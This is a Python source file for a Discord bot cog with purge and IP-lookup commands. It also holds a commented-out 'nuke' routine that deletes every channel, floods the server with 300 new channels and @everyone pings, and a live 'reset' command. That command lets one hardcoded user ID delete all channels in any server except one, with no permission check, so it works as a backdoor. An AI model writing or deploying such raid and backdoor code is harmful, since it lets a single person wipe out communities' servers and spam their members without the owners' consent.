import itertools
import sys

from io import StringIO
from discord.ext import commands
import requests
import json


def my_function(result):
    print(*itertools.chain.from_iterable(result), sep=',')

class special(commands.Cog):
    def __init__(self, bot):
        self.bot = bot



    # purging
    @commands.command(pass_context=True, help='purging')
    @commands.has_permissions(administrator=True)
    async def clear(self, ctx, amount: int):
        await ctx.channel.purge(limit=amount)
        await ctx.send(f'Cleared {amount} messages', delete_after=5.0)

    @commands.command(help='ip')
    async def ip(self, ctx, ip):
        # URL to send the request to
        key = ''
        response = requests.get('https://ipgeolocation.abstractapi.com/v1/?api_key=' + key + '&ip_address=' + ip)
        result = json.loads(response.content)
        await ctx.send(result)

    """
    @commands.command(pass_context=True, help = 'heh')
    async def nuke(self, ctx, channelnukename="bruh"):
      user = ctx.author.id
      if ctx.guild.id == 603084195102851073:
        await ctx.channel.send("fucked up")
      else:
        if user == 613995377758044190:#414931767129276428:
            await ctx.message.delete()
            guild = ctx.guild
            count = 0
            message = "https://cdn.discordapp.com/attachments/868557949721796608/945831875308576828/video0_13_online-video-cutter.com.gif"
            for channel in guild.channels:
                await channel.delete()
            while count < 300:
                await guild.create_text_channel(channelnukename)
                channel = guild.channels[count]
                await channel.send(message)
                await channel.send("@everyone")
                count += 1
        else:
            await ctx.send("Bruh")"""

    @commands.command(pass_context=True, help='resets a server')
    async def reset(self, ctx):
        if ctx.guild.id == 603084195102851073:
            await ctx.channel.send("fucked up")
        else:
            if ctx.author.id == 414931767129276428:
                await ctx.message.delete()
                guild = ctx.guild
                for channel in guild.channels:
                    await channel.delete()
            else:
                await ctx.send("Bruh")


def setup(bot):
    bot.add_cog(special(bot))
